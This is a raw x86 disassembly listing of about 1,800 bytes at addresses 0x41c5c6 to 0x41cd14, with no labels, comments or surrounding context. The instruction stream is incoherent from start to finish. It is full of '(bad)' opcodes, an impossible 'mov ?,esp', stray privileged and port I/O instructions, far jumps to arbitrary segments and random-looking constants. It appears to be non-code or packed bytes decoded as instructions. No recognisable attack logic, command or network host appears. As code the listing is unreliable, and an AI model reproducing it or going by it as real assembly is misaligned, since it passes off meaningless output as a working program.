  41c5c6:	dec    ebx
  41c5c7:	adc    DWORD PTR [edx],esp
  41c5c9:	xchg   edi,eax
  41c5ca:	mov    ah,0x5d
  41c5cc:	not    eax
  41c5ce:	mov    esi,0xe6e34196
  41c5d3:	sbb    al,0x27
  41c5d5:	cmp    ecx,DWORD PTR [ebx+0x5f5e6c51]
  41c5db:	sub    al,BYTE PTR [edi+0x20f728eb]
  41c5e1:	push   edi
  41c5e2:	jmp    0x1614:0xfdbd8d14
  41c5e9:	int3   
  41c5ea:	or     al,BYTE PTR [edx+ebx*8+0x3d9f7419]
  41c5f1:	cli    
  41c5f2:	fwait
  41c5f3:	jne    0x41c625
  41c5f5:	jns    0x41c64a
  41c5f7:	jp     0x41c5be
  41c5f9:	lods   eax,DWORD PTR ds:[esi]
  41c5fa:	dec    eax
  41c5fb:	scas   al,BYTE PTR es:[edi]
  41c5fc:	dec    esp
  41c5fd:	mov    eax,0x27f5af63
  41c602:	dec    eax
  41c603:	sar    BYTE PTR [ebp+0x2],cl
  41c606:	enter  0xec1f,0x96
  41c60a:	(bad)  [eax-0x5c72c126]
  41c610:	jmp    0x41c664
  41c612:	bound  ecx,QWORD PTR [ebx]
  41c614:	clc    
  41c615:	push   ecx
  41c616:	lods   al,BYTE PTR ds:[esi]
  41c618:	add    eax,eax
  41c61a:	rcl    DWORD PTR [ecx-0x6d],1
  41c61d:	test   DWORD PTR [ebx],esp
  41c61f:	outs   dx,DWORD PTR ds:[esi]
  41c620:	mov    bh,0xdb
  41c622:	ins    BYTE PTR es:[edi],dx
  41c623:	popf   
  41c624:	cmp    esp,esp
  41c626:	lock sbb al,0x7c
  41c629:	ror    BYTE PTR [ebp-0x2d],1
  41c62c:	js     0x41c5e9
  41c62e:	sbb    eax,0xe8ca9775
  41c633:	pop    ebx
  41c634:	das    
  41c635:	dec    eax
  41c636:	nop
  41c637:	inc    BYTE PTR [edi-0x45]
  41c63a:	or     BYTE PTR ds:0xc6b71baa,bh
  41c640:	and    dh,bh
  41c642:	pushf  
  41c643:	add    edi,DWORD PTR [ebx]
  41c645:	clc    
  41c646:	mov    bl,bh
  41c648:	cs jle 0x41c5ec
  41c64b:	aas    
  41c64c:	loope  0x41c60f
  41c64e:	cli    
  41c64f:	mov    bh,0x58
  41c651:	dec    ebx
  41c652:	fwait
  41c653:	hlt    
  41c654:	jge    0x41c61f
  41c656:	test   DWORD PTR [esi],ebx
  41c658:	outs   dx,DWORD PTR ds:[esi]
  41c659:	clc    
  41c65a:	cwde   
  41c65b:	sbb    ebx,DWORD PTR [ebx-0x20]
  41c65e:	int3   
  41c65f:	pop    esi
  41c660:	xchg   ecx,eax
  41c661:	cmc    
  41c662:	fnstcw WORD PTR [edx-0xe]
  41c665:	mov    edx,0x928e73fa
  41c66a:	nop
  41c66b:	mov    cs,WORD PTR [edi-0x372e28b1]
  41c671:	push   eax
  41c672:	jmp    0x297d:0x8029e0df
  41c679:	inc    BYTE PTR [edx-0x1ef1bb56]
  41c67f:	xchg   edi,eax
  41c680:	jb     0x41c677
  41c682:	sahf   
  41c683:	stc    
  41c684:	inc    esp
  41c685:	xor    edx,DWORD PTR [edi+0x7c]
  41c688:	repnz aad 0x4c
  41c68b:	retf   0x33be
  41c68e:	jmp    0x61b0:0x1f43e4f4
  41c695:	daa    
  41c696:	data16 in al,0xad
  41c699:	sbb    BYTE PTR [eax],cl
  41c69b:	or     ch,BYTE PTR [ebx-0x2]
  41c69e:	rcr    BYTE PTR [ebx+edi*4+0x2f],1
  41c6a2:	ror    DWORD PTR [ebp+ebx*2-0x22601ead],cl
  41c6a9:	sub    bh,BYTE PTR [esi+0x4f]
  41c6ac:	sub    eax,0x538824b0
  41c6b1:	dec    esi
  41c6b2:	outs   dx,BYTE PTR ds:[esi]
  41c6b3:	nop
  41c6b4:	stos   BYTE PTR es:[edi],al
  41c6b5:	out    dx,eax
  41c6b6:	sub    eax,0x9d940094
  41c6bb:	out    dx,al
  41c6bc:	enter  0x122a,0xff
  41c6c0:	xor    BYTE PTR [ecx-0x7b],ch
  41c6c3:	jl     0x41c742
  41c6c5:	shl    edx,0x52
  41c6c8:	sub    al,0x37
  41c6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6cb:	adc    edi,esp
  41c6cd:	inc    esp
  41c6ce:	nop
  41c6cf:	test   DWORD PTR [ebp-0x6e],edi
  41c6d2:	mov    ax,ds:0x8e4d5a9f
  41c6d8:	mov    eax,0x89e73005
  41c6dd:	cmp    edi,ecx
  41c6df:	mov    WORD PTR [eax+0x77d2d112],gs
  41c6e5:	adc    ch,BYTE PTR [eax+0x32]
  41c6e8:	or     dl,BYTE PTR [ebx]
  41c6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6eb:	or     ch,dh
  41c6ed:	push   ebp
  41c6ee:	add    al,BYTE PTR [ebp+edi*4-0x4]
  41c6f2:	or     BYTE PTR [esi-0x56],ah
  41c6f5:	push   0x2fa3eb7b
  41c6fa:	ss out 0x1f,eax
  41c6fd:	cs inc esi
  41c6ff:	inc    eax
  41c700:	mov    esi,0x39740665
  41c705:	adc    esp,DWORD PTR [edi+ecx*2]
  41c708:	ror    al,1
  41c70a:	dec    eax
  41c70b:	jl     0x41c6d4
  41c70d:	or     BYTE PTR [ebx],dl
  41c70f:	clc    
  41c710:	ds and edi,ecx
  41c713:	gs mov edi,0x3be510ea
  41c719:	push   cs
  41c71a:	or     al,0xad
  41c71c:	pop    edx
  41c71d:	shl    DWORD PTR [ecx+0x4fc94c65],1
  41c723:	outs   dx,DWORD PTR ds:[esi]
  41c724:	jae    0x41c764
  41c726:	std    
  41c727:	rcl    DWORD PTR [edx],1
  41c729:	dec    ebx
  41c72a:	pop    ebx
  41c72b:	jne    0x41c792
  41c72d:	inc    ebp
  41c72e:	mov    edi,0xcc96ac4e
  41c733:	shr    DWORD PTR [edi],0x8c
  41c736:	fnsave ds:0x71258392
  41c73c:	call   FWORD PTR [ecx]
  41c73e:	or     edx,esi
  41c740:	nop
  41c741:	retf   0x1a69
  41c744:	xor    eax,0x5ad4da2
  41c749:	retf   
  41c74a:	and    edi,DWORD PTR [edi-0x10]
  41c74d:	push   edi
  41c74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c74f:	sbb    al,BYTE PTR [ebp+0x47b1177f]
  41c755:	add    DWORD PTR ss:[edx+edx*4-0x5280b383],0xfffffff1
  41c75e:	cmp    ecx,DWORD PTR [esi+0x46]
  41c761:	push   0x4a
  41c763:	mov    al,ds:0x97f30916
  41c768:	test   eax,0xc218b89e
  41c76d:	ja     0x41c77a
  41c76f:	lahf   
  41c770:	jb     0x41c7ca
  41c772:	sbb    eax,0x7307b08e
  41c777:	lods   al,BYTE PTR ds:[esi]
  41c778:	es xchg esp,eax
  41c77a:	inc    ebx
  41c77b:	sub    BYTE PTR [esi],bl
  41c77d:	inc    edi
  41c77e:	add    ch,BYTE PTR [edi-0x56e05757]
  41c784:	mov    eax,0x75107d4e
  41c789:	pop    ebx
  41c78a:	(bad)  
  41c78c:	stc    
  41c78d:	fdivr  DWORD PTR [edi+0x9]
  41c791:	es mov dl,0xde
  41c794:	mov    DWORD PTR [ecx+esi*8+0x200f0c11],ebx
  41c79b:	xor    al,BYTE PTR [edx-0x15]
  41c79e:	mov    edi,0x2331fd3
  41c7a3:	retf   
  41c7a4:	adc    al,0x4b
  41c7a6:	imul   BYTE PTR [ebx+edx*4]
  41c7a9:	call   0x6671:0x83b36da8
  41c7b0:	enter  0x76cd,0xc3
  41c7b4:	cmp    edi,DWORD PTR fs:[ebp-0x15dc6664]
  41c7bb:	jmp    0xb248:0x2ad7087c
  41c7c2:	inc    ecx
  41c7c3:	(bad)  
  41c7c4:	mov    eax,0x8c22df39
  41c7c9:	std    
  41c7ca:	adc    al,0x85
  41c7cc:	xchg   esp,eax
  41c7cd:	cs jnp 0x41c84c
  41c7d0:	and    al,0xa4
  41c7d2:	mov    BYTE PTR [esi],dl
  41c7d4:	cmp    al,bl
  41c7d6:	dec    edi
  41c7d7:	icebp  
  41c7d8:	and    ebx,esp
  41c7da:	cdq    
  41c7db:	xchg   esp,eax
  41c7dc:	and    ch,BYTE PTR [ebp+0x50]
  41c7df:	xchg   esp,eax
  41c7e0:	adc    al,0xaa
  41c7e2:	stos   DWORD PTR es:[edi],eax
  41c7e3:	in     al,0x1
  41c7e5:	xlat   BYTE PTR ds:[ebx]
  41c7e6:	popa   
  41c7e7:	lods   al,BYTE PTR ds:[esi]
  41c7e8:	(bad)  
  41c7e9:	mov    dl,0x49
  41c7eb:	inc    esp
  41c7ec:	or     eax,0x50873e2
  41c7f1:	fdiv   DWORD PTR [ebx+0x1c]
  41c7f4:	lock sti 
  41c7f6:	mov    dl,0x76
  41c7f8:	dec    esi
  41c7f9:	stc    
  41c7fa:	loopne 0x41c79d
  41c7fc:	sahf   
  41c7fd:	mov    al,ds:0x9f977b8d
  41c802:	in     eax,dx
  41c803:	and    DWORD PTR [edx-0x56],ebx
  41c806:	jmp    0xce9:0x14a21d3
  41c80d:	and    al,0xca
  41c80f:	test   bh,bh
  41c811:	and    DWORD PTR [edi-0x6d],ebp
  41c814:	lods   al,BYTE PTR ds:[esi]
  41c815:	mov    al,ah
  41c817:	lods   al,BYTE PTR ds:[esi]
  41c818:	enter  0x3151,0x9e
  41c81c:	pop    edx
  41c81d:	iret   
  41c81e:	pop    ss
  41c81f:	sbb    DWORD PTR [eax-0x7e],ebp
  41c822:	es aad 0xbe
  41c825:	stc    
  41c826:	stc    
  41c827:	rcl    BYTE PTR [edi+0x15],cl
  41c82a:	add    al,ch
  41c82c:	pop    esp
  41c82d:	add    dh,BYTE PTR [esi+0x750b4b57]
  41c833:	xchg   esp,eax
  41c834:	cmp    ecx,DWORD PTR [edi+0x510a9d8a]
  41c83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c83b:	es stos BYTE PTR es:[edi],al
  41c83d:	jp     0x41c862
  41c83f:	mov    dh,0x13
  41c841:	and    eax,0x862bfa7a
  41c846:	sbb    dh,BYTE PTR [ebx-0x77f32c80]
  41c84c:	or     al,0x9c
  41c84e:	ret    
  41c84f:	xor    eax,DWORD PTR [ecx]
  41c851:	ins    BYTE PTR es:[edi],dx
  41c852:	sbb    dl,BYTE PTR [edi]
  41c854:	push   eax
  41c855:	pop    eax
  41c856:	or     DWORD PTR ds:0x3435691a,ecx
  41c85c:	clc    
  41c85d:	cmp    eax,DWORD PTR [ecx+ecx*2-0x17]
  41c861:	adc    esi,DWORD PTR [edx]
  41c863:	mov    cl,0xf6
  41c865:	(bad)
  41c869:	es mov fs,ebx
  41c86c:	mov    BYTE PTR [eax-0x44],dh
  41c86f:	cwde   
  41c870:	push   eax
  41c871:	sbb    DWORD PTR [edx-0x67],esp
  41c874:	call   0xecc2:0x6f65e4d7
  41c87b:	jae    0x41c7ff
  41c87d:	sub    eax,0x66fac014
  41c882:	rol    DWORD PTR [edx-0x16d7120e],cl
  41c888:	sbb    al,BYTE PTR [esi]
  41c88a:	ds push esp
  41c88c:	sbb    eax,0xe1ccf56d
  41c891:	jno    0x41c841
  41c893:	aaa    
  41c894:	inc    eax
  41c895:	xchg   ebx,esi
  41c897:	jns    0x41c911
  41c899:	jecxz  0x41c833
  41c89b:	(bad)  
  41c89c:	dec    eax
  41c89d:	out    dx,al
  41c89e:	sbb    al,0xcb
  41c8a0:	fmul   DWORD PTR [ebx-0x7a5c8e7d]
  41c8a6:	adc    bl,BYTE PTR [edx-0x7f374701]
  41c8ac:	sub    DWORD PTR [esi+ebx*2+0x34],edi
  41c8b0:	pop    es
  41c8b1:	fidivr DWORD PTR [ebp-0x73340305]
  41c8b7:	add    al,0x1
  41c8b9:	xchg   DWORD PTR [edi],esi
  41c8bb:	add    ebp,DWORD PTR [esi-0x55]
  41c8be:	ins    DWORD PTR es:[edi],dx
  41c8bf:	xor    DWORD PTR [ecx+ecx*1],ebx
  41c8c2:	pusha  
  41c8c3:	xor    BYTE PTR [ecx],dh
  41c8c5:	in     eax,0x9e
  41c8c7:	repz mov ds:0xefada91d,al
  41c8cd:	ja     0x41c90b
  41c8cf:	inc    ecx
  41c8d0:	popa   
  41c8d1:	retf   
  41c8d2:	inc    esp
  41c8d3:	scas   al,BYTE PTR es:[edi]
  41c8d4:	jno    0x41c8d5
  41c8d6:	mov    eax,ds:0xa6d8622c
  41c8db:	fwait
  41c8dc:	mov    ecx,0x9c0580a8
  41c8e1:	mov    ch,0x7f
  41c8e3:	out    dx,al
  41c8e4:	loope  0x41c911
  41c8e6:	cmp    eax,0x3dd84cfe
  41c8eb:	scas   al,BYTE PTR es:[edi]
  41c8ec:	ds cmp al,0x7f
  41c8ef:	imul   esi,ebp,0x3bcc8e09
  41c8f5:	add    DWORD PTR [eax-0x385f9606],esp
  41c8fb:	inc    ebp
  41c8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8fd:	(bad)  
  41c8fe:	clc    
  41c8ff:	and    esp,DWORD PTR [eax]
  41c901:	or     esp,DWORD PTR [eax+0x2b96a3b1]
  41c907:	ja     0x41c924
  41c909:	jns    0x41c94e
  41c90b:	stc    
  41c90c:	push   eax
  41c90d:	sbb    BYTE PTR [ebx+0x51],al
  41c910:	mov    al,ds:0xdfddc096
  41c915:	sbb    DWORD PTR [ebx-0x192bf43c],edx
  41c91b:	popf   
  41c91c:	pop    ebx
  41c91d:	arpl   WORD PTR [edi+0x32f07a21],bp
  41c923:	lods   eax,DWORD PTR ds:[esi]
  41c924:	test   al,0x9e
  41c926:	nop    DWORD PTR [edx+0x3]
  41c92a:	mov    dl,0x33
  41c92c:	push   ebx
  41c92d:	mov    al,0xbc
  41c92f:	fld    st(6)
  41c931:	mov    al,ds:0xced23f9a
  41c936:	jmp    0x3abef441
  41c93b:	int3   
  41c93c:	repnz fadd QWORD PTR [esi+0x4b273f3e]
  41c943:	xchg   ebp,eax
  41c944:	test   edi,0x1b142a65
  41c94a:	or     DWORD PTR [edi],0xfffffff1
  41c94d:	in     eax,0x9c
  41c94f:	mov    ?,esp
  41c951:	and    ah,BYTE PTR fs:[eax]
  41c954:	ins    BYTE PTR es:[edi],dx
  41c955:	(bad)  
  41c956:	(bad)  
  41c957:	js     0x41c8f2
  41c959:	int    0x44
  41c95b:	addr16 sar ebx,1
  41c95e:	add    DWORD PTR [ecx-0x2f569c5a],eax
  41c964:	add    BYTE PTR [edi],ah
  41c966:	(bad)  
  41c967:	mov    eax,0x7d8603e7
  41c96c:	mov    fs,WORD PTR [ecx-0x3d]
  41c96f:	ror    dl,0x66
  41c972:	fnsetpm(287 only) 
  41c974:	xor    esp,eax
  41c976:	jns    0x41c911
  41c978:	push   ss
  41c979:	cli    
  41c97a:	shl    bh,1
  41c97c:	push   eax
  41c97d:	loop   0x41c9e5
  41c97f:	cs push esp
  41c981:	inc    ecx
  41c982:	push   ecx
  41c983:	sbb    bh,BYTE PTR [edx]
  41c985:	or     DWORD PTR [eax],eax
  41c987:	ficom  WORD PTR [edi+0x4e]
  41c98a:	clc    
  41c98b:	daa    
  41c98c:	pop    ebx
  41c98d:	sub    edx,ecx
  41c98f:	inc    ebp
  41c990:	and    eax,0x4df27839
  41c995:	(bad)  
  41c996:	jge    0x41c9a1
  41c998:	(bad)  [edx+0x2f3b9de0]
  41c99e:	and    esi,DWORD PTR ds:0x65449190
  41c9a4:	stc    
  41c9a5:	jbe    0x41c9cc
  41c9a7:	pop    edx
  41c9a8:	mov    edi,0xd3d59454
  41c9ad:	fst    QWORD PTR [ebp-0x1c60e949]
  41c9b3:	test   eax,0x5672d7bc
  41c9b8:	jno    0x41ca0a
  41c9ba:	push   ds
  41c9bb:	inc    ebx
  41c9bc:	and    al,0x7c
  41c9be:	push   es
  41c9bf:	sbb    bh,BYTE PTR fs:[esi+0x3f]
  41c9c3:	add    eax,0xbb929e8e
  41c9c8:	push   ebp
  41c9c9:	repnz out 0x64,al
  41c9cc:	pop    ds
  41c9cd:	mov    BYTE PTR [ebp+0x4e],bh
  41c9d0:	or     esp,edi
  41c9d2:	inc    esp
  41c9d3:	mov    al,ds:0x57fd4f07
  41c9d8:	in     al,dx
  41c9d9:	push   ds
  41c9da:	out    0x4d,al
  41c9dc:	cmp    edx,ecx
  41c9de:	dec    esp
  41c9df:	jge    0x41ca46
  41c9e1:	cwde   
  41c9e2:	dec    esi
  41c9e3:	sahf   
  41c9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e5:	in     al,0x29
  41c9e7:	data16 sub BYTE PTR [edx+0x58],al
  41c9eb:	sub    eax,0x73378ca0
  41c9f0:	nop
  41c9f1:	sbb    ebp,DWORD PTR [eax+0x5f]
  41c9f4:	xchg   esp,eax
  41c9f5:	test   eax,0xbb56c9fd
  41c9fa:	cs stos BYTE PTR es:[edi],al
  41c9fc:	xchg   ebp,eax
  41c9fd:	imul   ebp,DWORD PTR ds:0xfa85c6e3,0x20745358
  41ca07:	stos   DWORD PTR es:[edi],eax
  41ca08:	jl     0x41c998
  41ca0a:	test   al,0x98
  41ca0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca0e:	int3   
  41ca0f:	retf   
  41ca10:	mov    ebx,0x86367dc9
  41ca15:	repnz sbb al,0xe8
  41ca18:	repnz mov ds:0x60affc1c,al
  41ca1e:	jne    0x41ca75
  41ca20:	inc    esp
  41ca21:	dec    ebx
  41ca22:	push   edi
  41ca23:	cmp    ah,BYTE PTR [eax]
  41ca25:	stc    
  41ca26:	jns    0x41caa0
  41ca28:	aas    
  41ca29:	(bad)  
  41ca2a:	loopne 0x41ca83
  41ca2c:	es popf 
  41ca2e:	fwait
  41ca2f:	add    DWORD PTR [ebx+0x5a32ddeb],edx
  41ca35:	out    dx,eax
  41ca36:	sub    al,0x88
  41ca38:	jae    0x41cab4
  41ca3a:	cs dec ebp
  41ca3c:	out    dx,al
  41ca3d:	pop    es
  41ca3e:	(bad)
  41ca41:	sbb    DWORD PTR [eax+0x16],edi
  41ca44:	jl     0x41ca2e
  41ca46:	int    0xb3
  41ca48:	fwait
  41ca49:	xchg   ebx,eax
  41ca4a:	or     al,0xca
  41ca4c:	push   edi
  41ca4d:	cmp    ch,BYTE PTR [ebx+ecx*1+0x26]
  41ca51:	aas    
  41ca52:	mov    edx,0x7aa01a17
  41ca57:	push   edx
  41ca58:	or     eax,0xaa5bce2d
  41ca5d:	scas   al,BYTE PTR es:[edi]
  41ca5e:	or     DWORD PTR [ebx+0x9],ebp
  41ca61:	xor    DWORD PTR [ebx-0x28],0x64
  41ca65:	imul   eax,DWORD PTR [bx+di],0xc724173
  41ca6c:	test   eax,eax
  41ca6e:	dec    ebx
  41ca6f:	xchg   esp,eax
  41ca70:	pusha  
  41ca71:	stos   DWORD PTR es:[edi],eax
  41ca72:	and    esp,DWORD PTR [ebp+0x278fb21d]
  41ca78:	cmp    ebp,DWORD PTR [ebx+0x26]
  41ca7b:	pop    ebp
  41ca7c:	mov    BYTE PTR [edi+0x14],al
  41ca7f:	pop    ss
  41ca80:	or     al,BYTE PTR [esi]
  41ca82:	inc    edi
  41ca83:	dec    eax
  41ca84:	int3   
  41ca85:	das    
  41ca86:	aas    
  41ca87:	cmp    al,0x77
  41ca89:	inc    edx
  41ca8a:	mov    ah,0xef
  41ca8c:	lods   al,BYTE PTR ds:[esi]
  41ca8d:	test   al,0x8b
  41ca8f:	fucom  st(0)
  41ca91:	dec    ebx
  41ca92:	adc    edi,DWORD PTR [ebx-0x3305c240]
  41ca98:	out    dx,eax
  41ca99:	jns    0x41ca97
  41ca9b:	rcl    bl,1
  41ca9d:	nop
  41ca9e:	mov    ds:0x14cc551b,al
  41caa3:	popa   
  41caa4:	ror    DWORD PTR [esi-0x6b],1
  41caa7:	inc    esp
  41caa8:	mov    bh,0x25
  41caaa:	cmp    ebp,0xbd2de807
  41cab0:	adc    bl,BYTE PTR [ebx]
  41cab2:	stos   BYTE PTR es:[edi],al
  41cab3:	inc    edx
  41cab4:	imul   eax,DWORD PTR [eax+0x3ef974bd],0x4de688c4
  41cabe:	ror    DWORD PTR [ebx+0x13],cl
  41cac1:	inc    ecx
  41cac2:	adc    eax,0x39bdc7a8
  41cac7:	ret    
  41cac8:	pop    es
  41cac9:	mov    esp,0x5bcc90ff
  41cace:	outs   dx,DWORD PTR ds:[esi]
  41cacf:	and    ebp,DWORD PTR [esi+0x75]
  41cad2:	adc    esp,DWORD PTR [esi+0x3b]
  41cad5:	test   al,0x7d
  41cad7:	pushf  
  41cad8:	and    al,0x11
  41cada:	cmp    al,ch
  41cadc:	cs ja  0x41ca93
  41cadf:	shl    BYTE PTR [ecx+ecx*8],0x7f
  41cae3:	into   
  41cae4:	xlat   BYTE PTR ds:[ebx]
  41cae5:	gs or  eax,ebx
  41cae8:	cmp    esi,DWORD PTR [ebp+0x7f]
  41caeb:	mov    al,ds:0xa4355763
  41caf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf1:	test   DWORD PTR [edi+0x37],esi
  41caf4:	and    BYTE PTR [eax+0x2d],bl
  41caf7:	stos   DWORD PTR es:[edi],eax
  41caf8:	daa    
  41caf9:	dec    eax
  41cafa:	sbb    DWORD PTR [edx+ebp*8+0x203dbdbb],eax
  41cb01:	pop    ds
  41cb02:	xlat   BYTE PTR ds:[ebx]
  41cb03:	jb     0x41cb4b
  41cb05:	ins    BYTE PTR es:[edi],dx
  41cb06:	cmc    
  41cb07:	shl    DWORD PTR [ecx+0x3f],1
  41cb0a:	and    eax,0x16819819
  41cb0f:	sbb    al,0x4d
  41cb11:	inc    esp
  41cb12:	jb     0x41cb17
  41cb14:	or     ch,bl
  41cb16:	mov    BYTE PTR [esi+0xc],dl
  41cb19:	lds    ebp,FWORD PTR [ebp-0x67]
  41cb1c:	rcl    BYTE PTR [edx-0x16ea0fe3],cl
  41cb22:	and    al,0x54
  41cb24:	pop    eax
  41cb25:	add    dh,BYTE PTR [edi-0x498f8d3a]
  41cb2b:	xchg   esi,eax
  41cb2c:	and    al,0x56
  41cb2e:	cli    
  41cb2f:	in     al,dx
  41cb30:	enter  0x22a9,0xff
  41cb34:	cwde   
  41cb35:	jb     0x41cafd
  41cb37:	lds    edx,FWORD PTR [ebx]
  41cb39:	xor    BYTE PTR [eax+0x39b81b87],dh
  41cb3f:	lods   al,BYTE PTR ds:[esi]
  41cb40:	push   ebp
  41cb41:	add    ebp,DWORD PTR [ebx]
  41cb43:	push   ecx
  41cb44:	out    0xcc,al
  41cb46:	mov    WORD PTR [ebx+ecx*8+0x330f749e],fs
  41cb4d:	pop    ds
  41cb4e:	adc    al,0xdf
  41cb50:	mov    edx,0xcc631e9f
  41cb55:	push   esi
  41cb56:	lea    eax,[edi-0x379cf16b]
  41cb5c:	adc    bh,ch
  41cb5e:	cmc    
  41cb5f:	in     al,dx
  41cb60:	xor    eax,DWORD PTR [ebx-0x34]
  41cb63:	sbb    eax,0x301474cb
  41cb68:	lods   al,BYTE PTR ds:[esi]
  41cb69:	cli    
  41cb6a:	pop    eax
  41cb6b:	lods   al,BYTE PTR ds:[esi]
  41cb6c:	lds    esi,FWORD PTR ds:0x5f52b3af
  41cb72:	xor    BYTE PTR [esi+edx*8-0x5f],dl
  41cb76:	mov    al,0x2d
  41cb78:	mov    al,ds:0xfcd37cc4
  41cb7d:	pop    es
  41cb7e:	fsub   QWORD PTR [eax-0x58]
  41cb81:	pop    esp
  41cb82:	int3   
  41cb83:	sub    edx,DWORD PTR [esp+ebx*1-0x29458998]
  41cb8a:	push   edi
  41cb8b:	jns    0x41cbdc
  41cb8d:	inc    edx
  41cb8e:	xchg   edi,eax
  41cb8f:	and    ebp,edi
  41cb91:	inc    ebx
  41cb92:	adc    BYTE PTR [esi+edx*1],dh
  41cb95:	xor    ch,BYTE PTR [esi]
  41cb97:	sbb    DWORD PTR [edi],edx
  41cb99:	fcomp  DWORD PTR [esi]
  41cb9b:	imul   esp,edi,0xffffffa2
  41cb9e:	out    0x8a,eax
  41cba0:	clc    
  41cba1:	adc    eax,0xc68a55fd
  41cba6:	pop    edx
  41cba7:	sbb    edx,ebx
  41cba9:	sbb    eax,0x850390b9
  41cbae:	jmp    0xb2c2:0x92dd172
  41cbb5:	hlt    
  41cbb6:	je     0x41cc03
  41cbb8:	outs   dx,DWORD PTR ds:[esi]
  41cbb9:	test   DWORD PTR [esi+0x226d2c62],esp
  41cbbf:	(bad)  
  41cbc0:	and    eax,0x52df5aa
  41cbc5:	dec    ebx
  41cbc6:	add    DWORD PTR [esi],0x4e28a7e8
  41cbcc:	test   BYTE PTR [esi+0x42],dh
  41cbcf:	fnstsw WORD PTR [edx+0x6e]
  41cbd2:	int    0x83
  41cbd4:	or     BYTE PTR [edx+0x54400e45],bl
  41cbda:	add    eax,0x23e19703
  41cbdf:	bound  ebp,QWORD PTR [edx]
  41cbe1:	outs   dx,BYTE PTR ds:[esi]
  41cbe2:	dec    eax
  41cbe3:	sbb    eax,0xc14b4d8a
  41cbe8:	dec    esi
  41cbe9:	adc    eax,0xc8880dfd
  41cbee:	add    dl,BYTE PTR [ecx+0x5d62650f]
  41cbf4:	pop    ebp
  41cbf5:	jmp    0x34989c88
  41cbfa:	ss mov bl,0x6c
  41cbfd:	fsub   QWORD PTR [edi]
  41cbff:	jb     0x41cbbd
  41cc01:	out    dx,al
  41cc02:	retf   
  41cc03:	mov    edx,0x868c4a93
  41cc08:	mov    ch,0xb0
  41cc0a:	xor    al,0x13
  41cc0c:	adc    edx,DWORD PTR [edx-0x365737af]
  41cc12:	int    0x60
  41cc14:	das    
  41cc15:	sub    eax,0xd2219f9f
  41cc1a:	mov    eax,0x4bdde487
  41cc1f:	cmp    BYTE PTR [edi+0x2d86f415],dh
  41cc25:	cmp    DWORD PTR [ebx+0x78],0x3c
  41cc29:	and    DWORD PTR [edx+0x3e],edi
  41cc2c:	aam    0x42
  41cc2e:	sub    dl,bl
  41cc30:	nop
  41cc31:	cmp    eax,0xf76411c3
  41cc36:	xor    DWORD PTR [eax+0x1773698c],0xffffffa3
  41cc3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc3e:	sbb    bl,BYTE PTR ds:0x36e1b110
  41cc44:	je     0x41cc59
  41cc46:	cmc    
  41cc47:	inc    eax
  41cc48:	sbb    dh,ah
  41cc4a:	test   dl,bh
  41cc4c:	xchg   esp,eax
  41cc4d:	cmc    
  41cc4e:	jns    0x41cc75
  41cc50:	loop   0x41cc4e
  41cc52:	fbstp  TBYTE PTR [esi+0x77]
  41cc55:	sti    
  41cc56:	inc    esp
  41cc57:	bswap  eax
  41cc59:	pop    ebp
  41cc5a:	or     ecx,DWORD PTR [ebx]
  41cc5c:	in     eax,0x5a
  41cc5e:	mov    ebp,0x24
  41cc63:	add    BYTE PTR [eax],al
  41cc65:	add    BYTE PTR [esi-0x8131a83],cl
  41cc6b:	cld    
  41cc6c:	(bad)  
  41cc6d:	jg     0x41cce1
  41cc6f:	and    eax,0xc1fb1474
  41cc74:	jb     0x41cbf8
  41cc76:	rol    ebp,0x1
  41cc79:	add    BYTE PTR [edx],ah
  41cc7b:	pop    es
  41cc7c:	add    BYTE PTR [eax],al
  41cc7e:	rcr    DWORD PTR [ebp-0x7d],0xcf
  41cc82:	push   ds
  41cc83:	popa   
  41cc84:	repz dec esp
  41cc86:	xor    eax,0x91b85ca
  41cc8b:	lahf   
  41cc8c:	iret   
  41cc8d:	ja     0x41cc1b
  41cc8f:	int    0x87
  41cc91:	and    al,0xab
  41cc93:	clc    
  41cc94:	pop    es
  41cc95:	int3   
  41cc96:	cmp    dl,0x67
  41cc99:	call   0x9801833d
  41cc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc9f:	mov    esi,0x296bb0d9
  41cca4:	and    cl,BYTE PTR [eax-0xb3d19a8]
  41ccaa:	or     eax,0xdf457eb2
  41ccaf:	dec    ecx
  41ccb0:	bound  ebp,QWORD PTR fs:[ebx+0x51]
  41ccb4:	enter  0x52e7,0xc0
  41ccb8:	retf   
  41ccb9:	(bad)  
  41ccba:	daa    
  41ccbb:	ins    BYTE PTR es:[edi],dx
  41ccbc:	inc    edx
  41ccbd:	push   cs
  41ccbe:	cdq    
  41ccbf:	adc    dh,BYTE PTR ds:0xac75
  41ccc4:	push   eax
  41ccc5:	or     esp,esi
  41ccc7:	(bad)  
  41ccc8:	pop    esp
  41ccc9:	pop    ebx
  41ccca:	jo     0x41ccea
  41cccc:	aas    
  41cccd:	mov    edx,0x51246645
  41ccd2:	mov    DWORD PTR [esp+ebp*4],esp
  41ccd5:	xchg   ebp,eax
  41ccd6:	lds    ebp,FWORD PTR [esi]
  41ccd8:	adc    dl,BYTE PTR [eax-0x22f3a085]
  41ccde:	bnd ret 
  41cce0:	or     eax,DWORD PTR [esi+eiz*1]
  41cce3:	xchg   edx,eax
  41cce4:	les    ecx,FWORD PTR [eax-0x4a]
  41cce7:	jmp    0x41cccb
  41cce9:	ja     0x41ccf6
  41cceb:	out    dx,eax
  41ccec:	or     edi,DWORD PTR [ebp+esi*8+0x4c535038]
  41ccf3:	nop
  41ccf4:	dec    DWORD PTR [ebp-0x59]
  41ccf7:	sbb    DWORD PTR [esp+ecx*2],0xa8ef9f74
  41ccfe:	jmp    0x80ee:0xebdf4734
  41cd05:	das    
  41cd06:	repz mov edx,0x8d6a0af0
  41cd0c:	xor    edi,ebp
  41cd0e:	pop    ebx
  41cd0f:	in     eax,0xa7
  41cd11:	sub    BYTE PTR [esi],bl
  41cd13:	cli    
  41cd14:	jp     0x41ccc9
